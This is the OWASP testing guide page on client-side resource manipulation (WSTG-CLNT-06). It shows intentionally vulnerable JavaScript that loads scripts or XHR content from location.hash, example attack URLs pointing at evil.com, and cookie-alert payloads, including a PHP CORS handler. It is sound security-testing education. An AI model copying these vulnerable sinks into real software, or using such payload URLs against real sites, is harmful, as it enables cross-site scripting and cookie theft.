# WSTG - Latest
[Home](https://owasp.org/www-project-web-security-testing-guide/) > [Latest](https://owasp.org/www-project-web-security-testing-guide/latest/) > [4-Web Application Security Testing](https://owasp.org/www-project-web-security-testing-guide/latest/4-Web_Application_Security_Testing/) > [11-Client-side Testing](https://owasp.org/www-project-web-security-testing-guide/latest/4-Web_Application_Security_Testing/11-Client-side_Testing/)
# Testing for Client-side Resource Manipulation
ID  
---  
WSTG-CLNT-06  
## Summary
A client-side resource manipulation vulnerability is an input validation flaw. It occurs when an application accepts user-controlled input that specifies the path of a resource such as the source of an iframe, JavaScript, applet, or the handler of an XMLHttpRequest. This vulnerability consists of the ability to control the URLs that link to some resources present in a web page. The impact of this vulnerability varies, and it is usually adopted to conduct XSS attacks. This vulnerability makes it is possible to interfere with the expected application’s behavior by causing it to load and render malicious objects.
The following JavaScript code shows a possible vulnerable script in which an attacker is able to control the `location.hash` (source) which reaches the attribute `src` of a script element. This particular case leads to a XSS attack as external JavaScript could be injected.
```
<script>
    var d=document.createElement("script");
    if(location.hash.slice(1)) {
        d.src = location.hash.slice(1);
    }
    document.body.appendChild(d);
</script>

```

An attacker could target a victim by causing them to visit this URL:
`www.victim.com/#https://evil.com/js.js`
Where `js.js` contains:
```
alert(document.cookie)

```

This would cause the alert to pop up on the victim’s browser.
A more damaging scenario involves the possibility of controlling the URL called in a CORS request. Since CORS allows the target resource to be accessible by the requesting domain through a header-based approach, the attacker may ask the target page to load malicious content from its own website.
Here is an example of a vulnerable page:
```
<b id="p"></b>
<script>
    function createCORSRequest(method, url) {
        var xhr = new XMLHttpRequest();
        xhr.open(method, url, true);
        xhr.onreadystatechange = function () {
            if (this.status == 200 && this.readyState == 4) {
                document.getElementById('p').innerHTML = this.responseText;
            }
        };
        return xhr;
    }

    var xhr = createCORSRequest('GET', location.hash.slice(1));
    xhr.send(null);
</script>

```

The `location.hash` is controlled by user input and is used for requesting an external resource, which will then be reflected through the construct `innerHTML`. An attacker could ask a victim to visit the following URL:
`www.victim.com/#https://evil.com/html.html`
With the payload handler for `html.html`:
```
<?php
header('Access-Control-Allow-Origin: https://www.victim.com');
?>
<script>alert(document.cookie);</script>

```

## Test Objectives
  * Identify sinks with weak input validation.
  * Assess the impact of the resource manipulation.


## How to Test
To manually check for this type of vulnerability, we must identify whether the application employs inputs without correctly validating them. If so, these inputs are under the control of the user and could be used to specify external resources. Since there are many resources that could be included in the application (such as images, video, objects, css, and iframes), the client-side scripts that handle the associated URLs should be investigated for potential issues.
The following table shows possible injection points (sink) that should be checked:
Resource Type | Tag/Method | Sink  
---|---|---  
Frame | iframe | src  
Link | a | href  
AJAX Request | `xhr.open(method, [url], true);` | URL  
CSS | link | href  
Image | img | src  
Object | object | data  
Script | script | src  
The most interesting ones are those that allow to an attacker to include client-side code (for example JavaScript) that could lead to XSS vulnerabilities.
* * *
[Edit on GitHub](https://github.com/OWASP/www-project-web-security-testing-guide/blob/master/latest/4-Web_Application_Security_Testing/11-Client-side_Testing/06-Testing_for_Client-side_Resource_Manipulation.md)
**The OWASP ® Foundation** works to improve the security of software through its community-led open source software projects, hundreds of chapters worldwide, tens of thousands of members, and by hosting local and global conferences. 
## Spotlight: Vijil, Inc.
[![image](https://owasp.org/assets/images/corp-member-logo/Vijil.png)](https://vijil.ai)
Vijil helps organizations build and operate AI agents that humans can trust. For enterprises that want to deploy their LLM applications intro production sooner with governance, risk management, and compliance, Vijil offers a layer of trust and safety that plugs into their AI platform. Vijil Evaluate, a quality assurance agent, automates testing of reliability, security, and safety with industry-leading rigor, scale, and speed. Vijil Dome, an adaptive perimeter defense mechanism, blocks adversarial inputs and out-of-policy outputs more holistically, accurately, and adaptively than other guardrails. Vijil Trust Audit enables customers to enforce OWASP guidelines for LLM security and governance.
## Corporate Supporters
[![image](https://owasp.org/assets/images/corp-member-logo/atlassian-logo-gradient-horizontal-blue@2x.png)](https://www.atlassian.com)[![image](https://owasp.org/assets/images/corp-member-logo/Automattic.png)](https://automattic.com/)[![image](https://owasp.org/assets/images/corp-member-logo/Zimperiumlogo_300x90px.jpeg)](https://www.zimperium.com/)[![image](https://owasp.org/assets/images/corp-member-logo/SecureFlag.png)](https://www.secureflag.com/)[![image](https://owasp.org/assets/images/corp-member-logo/tenable_logo.png)](https://www.tenable.com)[![image](https://owasp.org/assets/images/corp-member-logo/Arnica.png)](https://www.arnica.io)[![image](https://owasp.org/assets/images/corp-member-logo/SKUDONET.png)](https://www.skudonet.com)[![image](https://owasp.org/assets/images/corp-member-logo/fortify__logo__normal2x_1.png)](https://www.microfocus.com/en-us/cyberres/application-security)[![image](https://owasp.org/assets/images/corp-member-logo/blended_logoowasp.png)](http://blend-ed.com)
[Become a corporate supporter](https://owasp.org/supporters)
[](https://github.com/OWASP/) [](https://owasp.org/slack/invite) [](https://www.facebook.com/OWASPFoundation) [](https://infosec.exchange/@owasp) [](https://twitter.com/owasp) [](https://www.linkedin.com/company/owasp/) [](https://www.youtube.com/user/OWASPGLOBAL)
  * [HOME](https://owasp.org/)
  * [PROJECTS](https://owasp.org/projects/)
  * [CHAPTERS](https://owasp.org/chapters/)
  * [EVENTS](https://owasp.org/events/)
  * [ABOUT](https://owasp.org/about/)
  * [PRIVACY](https://owasp.org/www-policy/operational/privacy)
  * [SITEMAP](https://owasp.org/sitemap/)
  * [CONTACT](https://owasp.org/contact/)


OWASP, the OWASP logo, and Global AppSec are registered trademarks and AppSec Days, AppSec California, AppSec Cali, SnowFROC, OWASP Boston Application Security Conference, and LASCON are trademarks of the OWASP Foundation, Inc. Unless otherwise specified, all content on the site is Creative Commons Attribution-ShareAlike v4.0 and provided without warranty of service or accuracy. For more information, please refer to our [General Disclaimer](https://owasp.org/www-policy/operational/general-disclaimer.html). OWASP does not endorse or recommend commercial products or services, allowing our community to remain vendor neutral with the collective wisdom of the best minds in software security worldwide. Copyright 2025, OWASP Foundation, Inc. 
